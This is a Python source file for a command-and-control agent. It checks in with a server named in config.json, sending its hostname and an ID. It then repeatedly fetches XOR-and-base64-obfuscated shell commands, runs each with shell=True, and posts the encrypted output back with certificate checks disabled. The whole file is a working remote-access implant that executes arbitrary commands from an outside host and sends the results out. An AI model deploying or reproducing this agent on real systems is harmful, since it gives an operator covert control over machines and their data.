import time
import socket
import requests
import uuid
import subprocess
import os
import threading
import base64
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open("config.json", "r") as f:
    SERVER = json.load(f)["server_ip"]

def xor_encrypt(text, key=0x42):
    encrypted = bytes([ord(c) ^ key for c in text])
    return base64.b64encode(encrypted).decode()

def xor_decrypt(b64, key=0x42):
    encrypted = base64.b64decode(b64.encode())
    return ''.join(chr(b ^ key) for b in encrypted)

hostname = socket.gethostname()

try:
    with open("agent_id.txt", "r") as f:
        agent_id = f.read().strip()
except FileNotFoundError:
    agent_id = str(uuid.uuid4())
    with open("agent_id.txt", "w") as f:
        f.write(agent_id)

response = requests.post(
    f"{SERVER}/checkin",
    json={"id": agent_id, "hostname": hostname},
    verify=False
)

print(response.json())

def execute_task(task, agent_id):
    result = subprocess.run(task, shell=True, capture_output=True, text=True)
    stdout = result.stdout
    stderr = result.stderr

    encrypted_stdout = xor_encrypt(stdout)
    encrypted_stderr = xor_encrypt(stderr)

    data = {
        "id": agent_id,
        "task": task,
        "stdout": encrypted_stdout,
        "stderr": encrypted_stderr
    }

    result_response = requests.post(
        f"{SERVER}/result",
        json=data,
        verify=False
    )
    print(result_response.json())

try:
    while True:
        try:
            task_response = requests.get(
                f"{SERVER}/task/{agent_id}",
                verify=False
            )
            task_data = task_response.json()
            task = task_data.get("task", "no_task")

            if task == "no_task":
                time.sleep(5.0)
                continue

            task = xor_decrypt(task)

            if task == "kill":
                os.remove("agent_id.txt")
                print("Agent terminated.")
                break

            threading.Thread(target=execute_task, args=(task, agent_id)).start()

        except requests.exceptions.ConnectionError:
            print("Server unreachable. Retrying...")
            time.sleep(5)

        except Exception as e:
            print(f"Error: {e} has occured.")
            time.sleep(5)

except KeyboardInterrupt:
    print("Agent stopped.")
